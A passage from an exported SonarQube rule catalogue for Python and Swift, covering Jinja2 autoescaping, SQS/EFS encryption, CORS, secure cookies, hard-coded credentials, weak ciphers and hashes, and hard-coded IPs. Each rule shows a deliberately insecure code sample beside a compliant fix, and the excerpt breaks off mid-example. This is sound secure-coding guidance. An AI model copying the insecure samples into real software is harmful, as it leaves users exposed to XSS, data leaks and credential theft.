    <ul><li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li><li> there is no local mechanism in place to sanitize or validate the inputs. </li></ul>  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<pre>
from jinja2 import Environment

env &#61; Environment() # Sensitive: New Jinja2 Environment has autoescape set to false
env &#61; Environment(autoescape&#61;False) # Sensitive:
</pre>
<h2>Compliant Solution</h2>
<pre>
from jinja2 import Environment
env &#61; Environment(autoescape&#61;True) # Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" rel="nofollow">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6330">
              python:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The queue contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html" rel="nofollow">aws_cdk.aws_sqs.Queue</a>:</p>
<pre>
from aws_cdk import (
    aws_sqs as sqs
)

class QueueStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sqs.Queue( # Sensitive, unencrypted by default
            self,
            &#34;example&#34;
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html" rel="nofollow">aws_cdk.aws_sqs.CfnQueue</a>:</p>
<pre>
from aws_cdk import (
    aws_sqs as sqs
)

class CfnQueueStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sqs.CfnQueue( # Sensitive, unencrypted by default
            self,
            &#34;example&#34;
        )
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html" rel="nofollow">aws_cdk.aws_sqs.Queue</a>:</p>
<pre>
from aws_cdk import (
    aws_sqs as sqs
)

class QueueStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sqs.Queue(
            self,
            &#34;example&#34;,
            encryption&#61;sqs.QueueEncryption.KMS_MANAGED
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html" rel="nofollow">aws_cdk.aws_sqs.CfnQueue</a>:</p>
<pre>
from aws_cdk import (
    aws_sqs as sqs
)

class CfnQueueStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        my_key &#61; kms.Key(self, &#34;key&#34;)
        sqs.CfnQueue(
            self,
            &#34;example&#34;,
            kms_master_key_id&#61;my_key.key_id
        )
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html" rel="nofollow">AWS Documentation</a> -
  Encryption at rest </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6332">
              python:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The file system contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html" rel="nofollow">aws_cdk.aws_efs.FileSystem</a> and <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html" rel="nofollow">aws_cdk.aws_efs.CfnFileSystem</a>:</p>
<pre>
from aws_cdk import (
    aws_efs as efs
)

efs.FileSystem(
    self,
    &#34;example&#34;,
    encrypted&#61;False  # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html" rel="nofollow">aws_cdk.aws_efs.FileSystem</a> and <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html" rel="nofollow">aws_cdk.aws_efs.CfnFileSystem</a>:</p>
<pre>
from aws_cdk import (
    aws_efs as efs
)

efs.FileSystem(
    self,
    &#34;example&#34;,
    encrypted&#61;True
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html" rel="nofollow">AWS Documentation</a> - Data encryption in Amazon EFS </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5122">
              python:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0269" rel="nofollow">CVE-2018-0269</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-14460" rel="nofollow">CVE-2017-14460</a> </li></ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li><li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li><li> Your access control policy is dynamically defined by a user-controlled input like <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin" rel="nofollow"><code>origin</code></a> header. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li><li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li></ul>
<h2>Sensitive Code Example</h2>
<p>Django:</p>
<pre>
CORS_ORIGIN_ALLOW_ALL &#61; True # Sensitive
</pre>
<p>Flask:</p>
<pre>
from flask import Flask
from flask_cors import CORS

app &#61; Flask(__name__)
CORS(app, resources&#61;{r&#34;/*&#34;: {&#34;origins&#34;: &#34;*&#34;, &#34;send_wildcard&#34;: &#34;True&#34;}}) # Sensitive
</pre>
<p>User-controlled origin:</p>
<pre>
origin &#61; request.headers[&#39;ORIGIN&#39;]
resp &#61; Response()
resp.headers[&#39;Access-Control-Allow-Origin&#39;] &#61; origin # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Django:</p>
<pre>
CORS_ORIGIN_ALLOW_ALL &#61; False # Compliant
</pre>
<p>Flask:</p>
<pre>
from flask import Flask
from flask_cors import CORS

app &#61; Flask(__name__)
CORS(app, resources&#61;{r&#34;/*&#34;: {&#34;origins&#34;: &#34;*&#34;, &#34;send_wildcard&#34;: &#34;False&#34;}}) # Compliant
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
origin &#61; request.headers[&#39;ORIGIN&#39;]
resp &#61; Response()
if origin in TRUSTED_ORIGINS:
   resp.headers[&#39;Access-Control-Allow-Origin&#39;] &#61; origin
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">developer.mozilla.org</a> - CORS </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">developer.mozilla.org</a> - Same origin policy </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" rel="nofollow">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li><li> <a href="https://cwe.mitre.org/data/definitions/346" rel="nofollow">MITRE, CWE-346</a> - Origin Validation Error </li><li> <a href="https://cwe.mitre.org/data/definitions/942" rel="nofollow">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2092">
              python:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li><li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" rel="nofollow">mixed content</a> or not
  (ie HTTPS everywhere or not) </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li><li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>Flask</p>
<pre>
from flask import Response

&#64;app.route(&#39;/&#39;)
def index():
    response &#61; Response()
    response.set_cookie(&#39;key&#39;, &#39;value&#39;) # Sensitive
    return response
</pre>
<h2>Compliant Solution</h2>
<p>Flask</p>
<pre>
from flask import Response

&#64;app.route(&#39;/&#39;)
def index():
    response &#61; Response()
    response.set_cookie(&#39;key&#39;, &#39;value&#39;, secure&#61;True) # Compliant
    return response
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> <a href="https://cwe.mitre.org/data/definitions/614" rel="nofollow">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without &#39;Secure&#39; Attribute </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S2068">
              swift:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
let postData &#61; &#34;username&#61;Steve&amp;password&#61;123456&#34;.data(using: .utf8)  // Sensitive
//...
var request &#61; URLRequest(url: url)
request.HTTPBody &#61; postData
</pre>
<h2>Compliant Solution</h2>
<pre>
let postData &#61; &#34;username&#61;\(getEncryptedUser())&amp;password&#61;\(getEncryptedPass())&#34;.data(using: .utf8)
//...
var request &#61; URLRequest(url: url)
request.HTTPBody &#61; postData
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S2070">
              swift:S2070
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;swift%3AS4790&amp;rule_key&#61;swift%3AS4790" rel="nofollow">S4790</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>
<h3>Noncompliant code example</h3>
<pre>
import CryptoSwift

let bytes:Array&lt;UInt8&gt; &#61; [0x01, 0x02, 0x03]
let digest &#61; input.md5() // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
import CryptoSwift

let bytes:Array&lt;UInt8&gt; &#61; [0x01, 0x02, 0x03]
let digest &#61; input.sha256() // Compliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/328" rel="nofollow">MITRE, CWE-328</a> - Reversible One-Way Hash </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://shattered.io/" rel="nofollow">SHAttered</a> - The first concrete collision attack against SHA-1. </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S2278">
              swift:S2278
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;swift%3AS5547&amp;rule_key&#61;swift%3AS5547" rel="nofollow">S5547</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
let cryptor &#61; try Cryptor(operation: .encrypt, algorithm: .des, options: .none, key: key, iv: []) // Noncompliant

let crypt &#61; CkoCrypt2()
crypt.CryptAlgorithm &#61; &#34;3des&#34; // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
let cryptor &#61; try Cryptor(operation: .encrypt, algorithm: .aes, options: .none, key: key, iv: []) // Compliant

let crypt &#61; CkoCrypt2()
crypt.CryptAlgorithm &#61; &#34;aes&#34; // Compliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE" rel="nofollow">DES / DESede Unsafe</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S5547">
              swift:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in CommonCrypto</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import CommonCrypto

let algorithm &#61; CCAlgorithm(kCCAlgorithmDES) // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import Crypto

let sealedBox &#61; try AES.GCM.seal(input, using: key)
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S1313">
              swift:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
let host &#61; Host(address: &#34;192.168.12.42&#34;)
</pre>
<h2>Compliant Solution</h2>
<pre>
let host &#61; Host(address: configuration.ipAddress)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S4790">
              swift:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
import CryptoSwift

